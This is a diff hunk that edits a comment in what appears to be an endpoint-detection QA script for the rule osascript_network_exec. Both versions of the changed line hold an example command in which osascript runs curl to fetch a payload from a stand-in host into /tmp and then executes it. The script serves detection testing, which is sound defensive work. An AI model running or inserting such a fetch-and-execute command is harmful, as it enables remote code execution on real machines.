@@ -4,7 +4,7 @@
 #
 # Detection target: catalog rule osascript_network_exec.
 #
-# What the real VM equivalent looks like: osascript -e 'do shell script "curl -o /tmp/payload http://x.test/x"' then /tmp/payload -- see scripts/qa/attack-runbook.sh step 'osascript_network_exec'.
+# What the real VM equivalent looks like: osascript -e 'do shell script "curl -o /tmp/payload http://x.test/x"' then /tmp/payload. See scripts/qa/attack-runbook.sh step 'osascript_network_exec'.
 #
 # When the M11 self-hosted runner lands, this script will be invoked by
 # scripts/uat/system-test.sh against the edr-qa VM. Until then it exists
